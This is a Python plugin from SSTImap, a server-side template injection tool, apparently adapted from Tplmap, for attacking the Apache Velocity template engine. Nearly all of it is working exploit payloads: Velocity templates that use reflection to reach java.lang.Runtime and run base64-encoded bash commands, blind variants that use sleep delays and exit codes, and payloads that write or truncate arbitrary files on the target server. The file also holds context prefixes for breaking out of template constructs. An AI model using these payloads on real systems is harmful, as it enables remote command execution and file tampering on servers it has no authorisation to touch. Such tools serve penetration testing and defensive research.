from plugins.languages import java
from utils import rand


class Velocity(java.Java):
    priority = 5
    plugin_info = {
        "Description": """Apache Velocity template engine""",
        "Authors": [
            "Henshin @henshin https://github.com/henshin",  # Original payload for Tplmap
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
        "Engine": [
            "Homepage: https://velocity.apache.org/index.html",
            "Github: https://github.com/apache/velocity-engine",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '#set($h={header[0]}+{header[1]})${{h}}',
                'trailer': '#set($t={trailer[0]}+{trailer[1]})${{t}}',
                'test_render': f'#set($c={rand.randints[0]}*{rand.randints[1]})${{c}}',
                'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
            },
            'render_error': {
                'render': '{code}',
                'header': '#set($h={header[0]}+{header[1]})',
                # Body needs to set b as the output
                'trailer': '#set($t={trailer[0]}+{trailer[1]})#set($r=("Y:/A:/"+$h+$b+$t))#include($r)',
                'test_render': f'#set($b={rand.randints[0]}*{rand.randints[1]})',
                'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
            },
            'boolean': {
                'call': 'inject',
                'test_bool_true':  '#if(false)#include("Y:/A:/true")#end',
                'test_bool_false': '#if(true)#include("Y:/A:/false")#end',
                'verify_bool_true':  '#set($o=1.0)#if($o.equals(0.1))#include("Y:/A:/xxx")#end',
                'verify_bool_false': '#set($o=1.0)#if($o.equals(1.0))#include("Y:/A:/xxx")#end'
            },
            'execute': {
                # This payload comes from henshin's contribution on
                # issue #9.
                'call': 'render',
                'execute': """#set($engine="")\
#set($run=$engine.getClass().forName("java.lang.Runtime"))\
#set($runtime=$run.getRuntime())\
#set($proc=$runtime.exec("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}"))\
#set($null=$proc.waitFor())\
#set($istr=$proc.getInputStream())\
#set($chr=$engine.getClass().forName("java.lang.Character"))\
#set($output="")\
#set($string=$engine.getClass().forName("java.lang.String"))\
#foreach($i in [1..$istr.available()])\
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))\
#end\
${{output}}\
""" 
            },
            'execute_error': {
                'call': 'render',
                'execute': """#set($engine="")\
#set($run=$engine.getClass().forName("java.lang.Runtime"))\
#set($runtime=$run.getRuntime())\
#set($proc=$runtime.exec("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}"))\
#set($null=$proc.waitFor())\
#set($istr=$proc.getInputStream())\
#set($chr=$engine.getClass().forName("java.lang.Character"))\
#set($b="")\
#set($string=$engine.getClass().forName("java.lang.String"))\
#foreach($i in [1..$istr.available()])\
#set($b=$b.concat($string.valueOf($chr.toChars($istr.read()))))\
#end\
"""
            },
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """#set($engine="")\
#set($run=$engine.getClass().forName("java.lang.Runtime"))\
#set($runtime=$run.getRuntime())\
#set($proc=$runtime.exec("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}"))\
#set($null=$proc.waitFor())\
#set($res=$proc.exitValue())\
#if($res != 0)#include("Y:/A:/xxx")#end\
"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """#set($engine="")\
#set($run=$engine.getClass().forName("java.lang.Runtime"))\
#set($runtime=$run.getRuntime())\
#set($proc=$runtime.exec("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}"))\
#set($null=$proc.waitFor())\
#set($istr=$proc.getInputStream())\
#set($chr=$engine.getClass().forName("java.lang.Character"))\
#set($output="")\
#set($string=$engine.getClass().forName("java.lang.String"))\
#foreach($i in [1..$istr.available()])\
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))\
#end\
${{output}}\
"""
            },
            'write': {
                'call': 'inject',
                'write': """#set($engine="")\
#set($run=$engine.getClass().forName("java.lang.Runtime"))\
#set($runtime=$run.getRuntime())\
#set($proc=$runtime.exec("bash -c {{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}"))\
#set($null=$proc.waitFor())\
#set($istr=$proc.getInputStream())\
#set($chr=$engine.getClass().forName("java.lang.Character"))\
#set($output="")\
#set($string=$engine.getClass().forName("java.lang.String"))\
#foreach($i in [1..$istr.available()])\
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))\
#end\
${{output}}\
""",
                'truncate': """#set($engine="")\
#set($run=$engine.getClass().forName("java.lang.Runtime"))\
#set($runtime=$run.getRuntime())\
#set($proc=$runtime.exec("bash -c {{echo,-n,}}>{path}"))\
#set($null=$proc.waitFor())\
#set($istr=$proc.getInputStream())\
#set($chr=$engine.getClass().forName("java.lang.Character"))\
#set($output="")\
#set($string=$engine.getClass().forName("java.lang.String"))\
#foreach($i in [1..$istr.available()])\
#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))\
#end\
${{output}}\
"""
            },
        })

        self.set_contexts([
                # Text context, no closures
                {'level': 0},
                {'level': 1, 'prefix': '{closure})', 'suffix': '', 'closures': java.ctx_closures},
                # This catches
                # #if(%s == 1)\n#end
                # #foreach($item in %s)\n#end
                # #define( %s )a#end
                {'level': 3, 'prefix': '{closure}#end#if(1==1)', 'suffix': '', 'closures': java.ctx_closures},
                {'level': 5, 'prefix': '*#', 'suffix': '#*'},
        ])
